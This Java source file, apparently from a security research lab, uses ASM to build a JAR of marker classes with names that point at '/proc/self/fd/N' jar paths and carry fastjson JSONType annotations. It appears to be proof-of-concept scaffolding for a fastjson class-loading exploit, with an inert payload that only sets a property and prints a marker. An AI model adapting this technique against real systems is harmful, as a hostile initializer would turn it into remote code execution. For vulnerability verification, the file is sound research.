package lab.modernfd.artifact;

import java.io.BufferedOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

import org.objectweb.asm.AnnotationVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;

import static org.objectweb.asm.Opcodes.ACC_PUBLIC;
import static org.objectweb.asm.Opcodes.ACC_STATIC;
import static org.objectweb.asm.Opcodes.ACC_SUPER;
import static org.objectweb.asm.Opcodes.ALOAD;
import static org.objectweb.asm.Opcodes.GETSTATIC;
import static org.objectweb.asm.Opcodes.INVOKESPECIAL;
import static org.objectweb.asm.Opcodes.INVOKESTATIC;
import static org.objectweb.asm.Opcodes.INVOKEVIRTUAL;
import static org.objectweb.asm.Opcodes.POP;
import static org.objectweb.asm.Opcodes.RETURN;
import static org.objectweb.asm.Opcodes.V17;

/** Builds the inert seed class and marker-only FD candidate classes. */
public final class MarkerJarBuilder {
    private static final int FIRST_FD = 3;
    private static final int LAST_FD = 160;
    private static final String MARKER_KEY = "FASTJSON_MODERN_FD_MARKER";
    private static final String MARKER_VALUE = "fastjson-modern-fd-marker-v1";

    private MarkerJarBuilder() {
    }

    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            throw new IllegalArgumentException("usage: MarkerJarBuilder OUTPUT_JAR");
        }
        Path output = Path.of(args[0]);
        Files.createDirectories(output.toAbsolutePath().getParent());
        try (OutputStream file = Files.newOutputStream(output);
             JarOutputStream jar = new JarOutputStream(new BufferedOutputStream(file))) {
            // This entry is only a cache seed.  It deliberately has no JSONType
            // annotation and no class initializer.
            add(jar, "foo/Exception.class", classBytes("foo/Exception", false));

            for (int fd = FIRST_FD; fd <= LAST_FD; fd++) {
                String entry = "fd" + fd + "/Exception.class";
                String internalName = "jar:file:/proc/self/fd/" + fd
                        + "!/fd" + fd + "/Exception";
                add(jar, entry, classBytes(internalName, true));
            }
        }
        System.out.println("marker-only jar=" + output + " candidates="
                + FIRST_FD + "-" + LAST_FD + " bytes=" + Files.size(output));
    }

    private static void add(JarOutputStream jar, String name, byte[] bytes) throws IOException {
        JarEntry entry = new JarEntry(name);
        entry.setTime(0L);
        jar.putNextEntry(entry);
        jar.write(bytes);
        jar.closeEntry();
    }

    private static byte[] classBytes(String internalName, boolean markerClass) {
        ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        writer.visit(V17, ACC_PUBLIC | ACC_SUPER, internalName, null,
                "java/lang/Object", null);

        if (markerClass) {
            AnnotationVisitor annotation = writer.visitAnnotation(
                    "Lcom/alibaba/fastjson/annotation/JSONType;", true);
            annotation.visitEnd();
        }

        MethodVisitor constructor = writer.visitMethod(ACC_PUBLIC, "<init>", "()V",
                null, null);
        constructor.visitCode();
        constructor.visitVarInsn(ALOAD, 0);
        constructor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>",
                "()V", false);
        constructor.visitInsn(RETURN);
        constructor.visitMaxs(0, 0);
        constructor.visitEnd();

        if (markerClass) {
            MethodVisitor initializer = writer.visitMethod(ACC_STATIC, "<clinit>",
                    "()V", null, null);
            initializer.visitCode();
            initializer.visitLdcInsn(MARKER_KEY);
            initializer.visitLdcInsn(MARKER_VALUE);
            initializer.visitMethodInsn(INVOKESTATIC, "java/lang/System", "setProperty",
                    "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;", false);
            initializer.visitInsn(POP);
            initializer.visitFieldInsn(GETSTATIC, "java/lang/System", "out",
                    "Ljava/io/PrintStream;");
            initializer.visitLdcInsn("FASTJSON_MODERN_FD_MARKER=" + MARKER_VALUE);
            initializer.visitMethodInsn(INVOKEVIRTUAL, "java/io/PrintStream", "println",
                    "(Ljava/lang/String;)V", false);
            initializer.visitInsn(RETURN);
            initializer.visitMaxs(0, 0);
            initializer.visitEnd();
        }

        writer.visitEnd();
        return writer.toByteArray();
    }
}
